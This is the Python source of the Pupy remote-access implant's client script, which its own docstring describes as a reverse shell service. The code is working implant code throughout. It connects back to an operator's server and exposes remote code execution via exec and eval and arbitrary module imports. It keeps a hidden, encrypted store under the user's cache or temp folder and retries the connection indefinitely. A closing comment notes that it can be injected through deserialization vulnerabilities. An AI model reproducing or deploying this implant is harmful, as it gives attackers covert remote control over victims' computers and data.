#!/usr/bin/env python
# -*- coding: utf-8 -*-
# ---------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice,
# this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice,
# this list of conditions and the following disclaimer in the documentation
# and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors
# may be used to endorse or promote products derived from this software without
# specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE
# ---------------------------------------------------------------

import sys
import imp

try:
    import pupy
    setattr(pupy, 'pseudo', False)

except ImportError, e:
    mod = imp.new_module("pupy")
    mod.__name__ = "pupy"
    mod.__file__ = "pupy://pupy"
    mod.__package__ = "pupy"
    sys.modules["pupy"] = mod
    mod.pseudo = True

    import pupy

import socket
socket.setdefaulttimeout(60)

import logging

logging.basicConfig()
logger = logging.getLogger('pp')
logger.setLevel(logging.WARNING)

import time
from rpyc.core.service import Service, ModuleNamespace
from rpyc.lib.compat import execute

import threading
import traceback
import os
import json
import platform
import random
import argparse

from network import conf
from network.lib.base_launcher import LauncherError
from network.lib.connection import PupyConnection
from network.lib.streams.PupySocketStream import PupyChannel

import shlex
import zlib
import signal

import cPickle
import ssl

import hashlib
import uuid
from network.lib.transports.cryptoutils.aes import \
     NewAESCipher as AES, \
     append_PKCS7_padding as pad, \
     strip_PKCS7_padding as unpad

try:
    # additional imports needed to package with pyinstaller
    import additional_imports

except ImportError:
    pass

except Exception as e:
    logger.warning(e)

import umsgpack

pupy.infos = {}  # global dictionary to store informations persistent through a deconnection
pupy.namespace = None

if not sys.platform == 'win32' and not pupy.pseudo:
    setattr(ssl, '_SSL_FILES', [
        "/etc/ssl/certs/ca-certificates.crt",
        "/etc/pki/tls/certs/ca-bundle.crt",
        "/etc/ssl/ca-bundle.pem",
        "/etc/pki/tls/cacert.pem",
        "/etc/pki/ca-trust/extracted/pem/tls-ca-bundle.pem",
    ])

    setattr(ssl, '_SSL_PATHS', [
        "/etc/ssl/certs",
        "/system/etc/security/cacerts",
        "/usr/local/share/certs",
        "/etc/pki/tls/certs",
        "/etc/openssl/certs",
    ])

    ctx = ssl.create_default_context()
    for path in ssl._SSL_PATHS:
        try:
            ctx.load_verify_locations(capath=path)
        except:
            pass

    for path in ssl._SSL_FILES:
        try:
            ctx.load_verify_locations(cafile=path)
        except:
            pass

    setattr(ssl, '_CACHED_SSL_CERTS', ctx.get_ca_certs(binary_form=True))

    def set_default_verify_paths(self):
        for cert in ssl._CACHED_SSL_CERTS:
            self.load_verify_locations(cadata=cert)

    ssl.SSLContext.set_default_verify_paths = set_default_verify_paths


def print_exception(tag=''):
    global debug

    remote_print_error = None
    dprint = None

    trace = str(traceback.format_exc())
    error = ' '.join([ x for x in (
        tag, 'Exception:', trace
    ) if x ])

    try:
        import pupyimporter
        remote_print_error = pupyimporter.remote_print_error
        dprint = pupyimporter.dprint
    except:
        pass

    if remote_print_error:
        try:
            dprint('Remote error: {}'.format(error))
            remote_print_error(error)
        except:
            pass

    elif dprint:
        dprint(error)
    elif debug:
        try:
            logger.error(error)
        except:
            print error

class PStore(object):
    def __new__(cls, *args, **kw):
        if not hasattr(cls, '_instance'):
            orig = super(PStore, cls)
            cls._instance = orig.__new__(cls, *args, **kw)

        return cls._instance

    def __init__(self, pstore_dir='~'):
        try:
            import getpass
            uid = getpass.getuser()
        except:
            uid = os.getuid()

        seed = '{}:{}'.format(uid, uuid.getnode())

        h = hashlib.sha1()
        h.update(seed)

        if os.name == 'posix':
            if pstore_dir == '~':
                pstore_dir = os.path.join(pstore_dir, '.cache')
            pstore_name = '.{}'.format(h.hexdigest())
        else:
            if pstore_dir == '~':
                pstore_dir = os.path.join(
                    pstore_dir, 'AppData', 'Local', 'Temp'
                )
            pstore_name = h.hexdigest()

        self._pstore_path = os.path.expanduser(
            os.path.join(pstore_dir, pstore_name)
        )

        h = hashlib.sha1()
        h.update('password' + seed)

        self._pstore_key = (h.digest()[:16], '\x00'*16)
        self._pstore = {}

        self.load()

    def __getitem__(self, key):
        if issubclass(type(key), object):
            key = type(key).__name__
        return self._pstore.get(key)

    def __setitem__(self, key, value):
        if issubclass(type(key), object):
            key = type(key).__name__
        self._pstore[key] = value

    def load(self):
        if not os.path.exists(self._pstore_path):
            return

        data = None
        try:
            with open(self._pstore_path, 'rb') as pstore:
                data = pstore.read()

            try:
                os.unlink(self._pstore_path)
            except:
                print_exception('PS/L')

            if not data:
                return

            data = AES(*self._pstore_key).decrypt(data)
            data = unpad(data)
            data = cPickle.loads(data)
        except:
            print_exception('[PS/L]')
            return

        if type(data) == dict:
            self._pstore.update(data)

    def store(self):
        if not self._pstore:
            return

        pstore_dir = os.path.dirname(self._pstore_path)
        try:
            if not os.path.isdir(pstore_dir):
                os.makedirs(pstore_dir)

            with open(self._pstore_path, 'w+b') as pstore:
                data = cPickle.dumps(self._pstore)
                data = pad(data)
                data = AES(*self._pstore_key).encrypt(data)
                pstore.write(data)

        except:
            print_exception('[PS/S]')
            return


class Task(threading.Thread):
    stopped = None
    results_type = list

    def __init__(self, manager, *args, **kwargs):
        threading.Thread.__init__(self)
        self.daemon = True
        self._pstore = manager.pstore
        self._stopped = threading.Event()
        if not self._pstore[self]:
            self._pstore[self] = self.results_type()
        self._manager = manager
        self._dirty = False

    @property
    def name(self):
        return type(self).__name__

    @property
    def results(self):
        results = self._pstore[self]
        self._pstore[self] = self.results_type()
        self._dirty = False
        return results

    @property
    def dirty(self):
        return self._dirty

    def append(self, result):
        if self.results_type in (str, unicode):
            self._pstore[self] += result
        elif self.results_type == list:
            self._pstore[self].append(result)
        elif self.results_type == set:
            self._pstore[self].add(result)
        else:
            raise TypeError('Unknown results type: {}'.format(self.results_type))
        self._dirty = True

    def stop(self):
        if self._stopped and self.active:
            self._stopped.set()

    def run(self):
        try:
            self.task()
        except:
            print_exception('[T/R:{}]'.format(self.name))
            if self._stopped:
                self._stopped.set()

    @property
    def active(self):
        if self._stopped is None:
            return False

        try:
            return not self._stopped.is_set()

        except:
            print_exception('[T/A:{}]'.format(self.name))
            return False

    def event(self, event):
        pass

class Manager(object):
    TERMINATE = 0
    PAUSE = 1
    SESSION = 2

    def __new__(cls, *args, **kw):
        if not hasattr(cls, '_instance'):
            orig = super(Manager, cls)
            cls._instance = orig.__new__(cls, *args, **kw)

        return cls._instance

    def __init__(self, pstore):
        self.tasks = {}
        self.pstore = pstore

    def get(self, klass):
        name = klass.__name__
        return self.tasks.get(name)

    def create(self, klass, *args, **kwargs):
        name = klass.__name__
        if not name in self.tasks:
            try:
                task = klass(self, *args, **kwargs)
                task.start()
                self.tasks[name] = task
                return task

            except:
                print_exception('[M/C:{}]'.format(name))

    def stop(self, klass, force=False):
        name = klass.__name__
        if name in self.tasks:
            try:
                self.tasks[name].stop()
                del self.tasks[name]
            except:
                print_exception('[M/S:{}]'.format(name))
                if force:
                    del self.tasks[name]

    def active(self, klass=None):
        name = klass.__name__
        if name in self.tasks:
            if not self.tasks[name].stopped:
                # Failed somewhere in the middle
                del self.tasks[name]
                return False

            return self.tasks[name].stopped.is_set()
        else:
            return False

    @property
    def dirty(self):
        return any(x.dirty for x in self.tasks.itervalues())

    @property
    def status(self):
        return {
            name:{
                'active': task.active,
                'results': task.dirty,
            } for name,task in self.tasks.iteritems()
        }

    def event(self, event):
        for task in self.tasks.itervalues():
            try:
                task.event(event)
            except:
                print_exception('[M/E:{}:{}]'.format(task.name, event))

        if event == self.TERMINATE:
            for task in self.tasks.itervalues():
                try:
                    task.stop()
                except:
                    print_exception('[M/E:{}:{}]'.format(task.name, event))

            self.pstore.store()

setattr(pupy, 'manager', Manager(PStore()))
setattr(pupy, 'Task', Task)
setattr(pupy, 'connected', False)

def safe_obtain(proxy):
    """ safe version of rpyc's rpyc.utils.classic.obtain, without using pickle. """

    if type(proxy) in [list, str, bytes, dict, set, type(None)]:
        return proxy

    conn = object.__getattribute__(proxy, "____conn__")()
    if not hasattr(conn, 'obtain'):
        setattr(conn, 'obtain', conn.root.msgpack_dumps)

    return umsgpack.loads(
        zlib.decompress(
            conn.obtain(proxy, compressed=True)
        )
    ) # should prevent any code execution

debug = False

setattr(pupy, 'obtain', safe_obtain) # I don't see a better spot to put this util

LAUNCHER = "connect"  # the default launcher to start when no argv
# default launcher arguments
LAUNCHER_ARGS = shlex.split("--host 127.0.0.1:443 --transport ssl")

REVERSE_SLAVE_CONF = dict(
    allow_all_attrs=True,
    allow_public_attrs=True,
    allow_pickle=True,
    allow_getattr=True,
    allow_setattr=True,
    allow_delattr=True,
    import_custom_exceptions=False,
    propagate_SystemExit_locally=True,
    propagate_KeyboardInterrupt_locally=True,
    instantiate_custom_exceptions=True,
    instantiate_oldstyle_exceptions=True,
)

class UpdatableModuleNamespace(ModuleNamespace):
    __slots__ = ['__invalidate__']

    def __invalidate__(self, name):
        cache = self._ModuleNamespace__cache
        if name in cache:
            del cache[name]

class ReverseSlaveService(Service):
    """ Pupy reverse shell rpyc service """
    __slots__ = ["exposed_namespace", "exposed_cleanups"]

    def on_connect(self):
        self.exposed_namespace = {}
        self.exposed_cleanups = []
        self._conn._config.update(REVERSE_SLAVE_CONF)

        pupy.namespace = UpdatableModuleNamespace(self.exposed_getmodule)
        self._conn.root.set_modules(pupy.namespace)

    def on_disconnect(self):
        for cleanup in self.exposed_cleanups:
            try:
                cleanup()
            except:
                print_exception('[D]')

        self.exposed_cleanups = []

        try:
            self._conn.close()
        except:
            print_exception('[DC]')

        if os.name == 'posix':
            try:
                pid = os.waitpid(-1, os.WNOHANG)
                attempt = 0
                while pid != 0 and attempt < 1024:
                    pid = os.waitpid(-1, os.WNOHANG)
                    attempt += 1

            except OSError:
                pass


    def exposed_exit(self):
        try:
            return True
        finally:
            os._exit(0)

    def exposed_register_cleanup(self, method):
        self.exposed_cleanups.append(method)

    def exposed_unregister_cleanup(self, method):
        self.exposed_cleanups.remove(method)

    def exposed_execute(self, text):
        """execute arbitrary code (using ``exec``)"""
        execute(text, self.exposed_namespace)

    def exposed_get_infos(self, s=None):
        import pupy

        if not s:
            return {
                k:v for k,v in pupy.infos.iteritems() if not k in (
                    'launcher_inst',
                )
            }

        if s not in pupy.infos:
            return None

        return pupy.infos[s]

    def exposed_eval(self, text):
        """evaluate arbitrary code (using ``eval``)"""
        return eval(text, self.exposed_namespace)

    def exposed_getmodule(self, name):
        """imports an arbitrary module"""
        return __import__(name, None, None, "*")

    def exposed_msgpack_dumps(self, obj, compressed=False):
        data = umsgpack.dumps(obj)
        if compressed:
            data = zlib.compress(data)
        return data

    def exposed_json_dumps(self, obj, compressed=False):
        try:
            data = json.dumps(obj, ensure_ascii=False)
        except:
            try:
                import locale
                data = json.dumps(
                    obj,
                    ensure_ascii=False,
                    encoding=locale.getpreferredencoding()
                )
            except:
                data = json.dumps(
                    obj,
                    ensure_ascii=False,
                    encoding='latin1'
                )

        if compressed:
            if type(data) == unicode:
                data = data.encode('utf-8')

            data = zlib.compress(data)

        return data

    def exposed_getconn(self):
        """returns the local connection instance to the other side"""
        return self._conn


class BindSlaveService(ReverseSlaveService):

    def on_connect(self):
        self.exposed_namespace = {}
        self.exposed_cleanups = []
        self._conn._config.update(REVERSE_SLAVE_CONF)
        import pupy
        try:
            from pupy_credentials import BIND_PAYLOADS_PASSWORD
            password = BIND_PAYLOADS_PASSWORD
        except:
            from pupylib.PupyCredentials import Credentials
            credentials = Credentials()
            password = credentials['BIND_PAYLOADS_PASSWORD']

        if self._conn.root.get_password() != password:
            self._conn.close()
            raise KeyboardInterrupt("wrong password")

        pupy.namespace = UpdatableModuleNamespace(self.exposed_getmodule)
        self._conn.root.set_modules(pupy.namespace)

def get_next_wait(attempt):
    if attempt < 120:
        return random.randint(5, 10) / 10.0
    elif attempt < 320:
        return random.randint(30, 50) / 10.0
    else:
        return random.randint(150, 300) / 10.0


def set_connect_back_host(HOST):
    import pupy
    pupy.get_connect_back_host = (lambda: HOST)

def handle_sigchld(*args, **kwargs):
    os.waitpid(-1, os.WNOHANG)

def handle_sighup(*args):
    pass

def handle_sigterm(*args):
    try:
        if hasattr(pupy, 'manager'):
            pupy.manager.event(Manager.TERMINATE)

    except:
        print_exception('[ST]')

    os._exit(0)

attempt = 0

def main():
    global LAUNCHER
    global LAUNCHER_ARGS
    global debug
    global attempt

    if hasattr(pupy, 'initialized'):
        return

    setattr(pupy, 'initialized', True)

    try:
        if hasattr(signal, 'SIGHUP'):
            signal.signal(signal.SIGHUP, handle_sighup)
        if hasattr(signal, 'SIGTERM'):
            signal.signal(signal.SIGTERM, handle_sigterm)
    except:
        print_exception('[MS]')

    if hasattr(pupy, 'set_exit_session_callback'):
        pupy.set_exit_session_callback(handle_sigterm)

    if len(sys.argv) > 1:
        parser = argparse.ArgumentParser(
            prog='pp.py',
            formatter_class=argparse.RawTextHelpFormatter,
            description="Starts a reverse connection to a Pupy server using the selected launcher\nLast sources: https://github.com/n1nj4sec/pupy\nAuthor: @n1nj4sec (contact@n1nj4.eu)\n")
        parser.add_argument(
            '--debug',
            action='store_true',
            help="increase verbosity")
        parser.add_argument(
            'launcher',
            choices=[
                x for x in conf.launchers],
            help="the launcher to use")
        parser.add_argument(
            'launcher_args',
            nargs=argparse.REMAINDER,
            help="launcher arguments")
        args = parser.parse_args()

        if not debug:
            debug = bool(args.debug)

        LAUNCHER = args.launcher
        LAUNCHER_ARGS = shlex.split(' '.join(args.launcher_args))

    if hasattr(pupy, 'get_pupy_config'):
        try:
            config_file = pupy.get_pupy_config()
            exec config_file in globals()
        except ImportError, e:
            logger.warning(
                "ImportError: Couldn't load pupy config: {}".format(e))

    if LAUNCHER not in conf.launchers:
        sys.exit("No such launcher: %s" % LAUNCHER)

    if debug:
        logging.getLogger().setLevel(logging.DEBUG)

    launcher = conf.launchers[LAUNCHER]()

    try:
        launcher.parse_args(LAUNCHER_ARGS)
    except LauncherError as e:
        launcher.arg_parser.print_usage()
        os._exit(1)

    if pupy.pseudo:
        set_connect_back_host(launcher.get_host())
    else:
        pupy.get_connect_back_host = launcher.get_host

    pupy.infos['launcher'] = LAUNCHER
    pupy.infos['launcher_args'] = LAUNCHER_ARGS
    pupy.infos['launcher_inst'] = launcher
    pupy.infos['transport'] = launcher.get_transport()
    pupy.infos['debug'] = debug
    pupy.infos['native'] = pupy.pseudo == False
    pupy.infos['revision'] = getattr(pupy, 'revision', None)

    exited = False

    while not exited:
        try:
            rpyc_loop(launcher)

        except Exception as e:
            print_exception('[ML]')

            if type(e) == SystemExit:
                exited = True

        finally:
            if not exited:
                time.sleep(get_next_wait(attempt))
                attempt += 1


def rpyc_loop(launcher):
    global attempt
    global debug

    stream = None
    for ret in launcher.iterate():
        try:
            pupy.connected = False
            if isinstance(ret, tuple):  # bind payload
                server_class, port, address, authenticator, stream, transport, transport_kwargs = ret
                s = server_class(
                    BindSlaveService,
                    port=port,
                    hostname=address,
                    authenticator=authenticator,
                    stream=stream,
                    transport=transport,
                    transport_kwargs=transport_kwargs,
                    pupy_srv=None,
                )
                s.start()
                pupy.connected = True

            else:  # connect payload
                stream = ret

                def check_timeout(event, cb, timeout=60):
                    time.sleep(timeout)
                    if not event.is_set():
                        logger.error('timeout occured!')
                        cb()

                event = threading.Event()
                t = threading.Thread(
                    target=check_timeout, args=(
                        event, stream.close))
                t.daemon = True
                t.start()

                lock = threading.Lock()
                conn = None

                try:
                    logger.debug('Starting pupy connection')
                    conn = PupyConnection(
                        lock, None, ReverseSlaveService,
                        PupyChannel(stream), config={},
                        ping=stream.KEEP_ALIVE_REQUIRED
                    )
                    logger.debug('Initialize connection')
                    conn._init_service()
                    logger.debug('Initialize complete')
                finally:
                    event.set()

                attempt = 0

                pupy.connected = True
                logger.debug('Serve')
                while not conn.closed:
                    data = None
                    with lock:
                        data = conn.serve()

                    conn.dispatch(data)

        except SystemExit:
            raise

        except EOFError:
            pass

        except:
            print_exception('[M]')

        finally:
            if stream is not None:
                try:
                    stream.close()
                except:
                    pass

if __name__ == "__main__":
    main()
else:
    if not platform.system() == 'android':
        if not hasattr(platform, 'pupy_thread'):
            # to allow pupy to run in background when imported or injected
            # through a python application exec/deserialization vulnerability
            t = threading.Thread(target=main)
            t.daemon = True
            t.start()
            setattr(platform, 'pupy_thread', t)
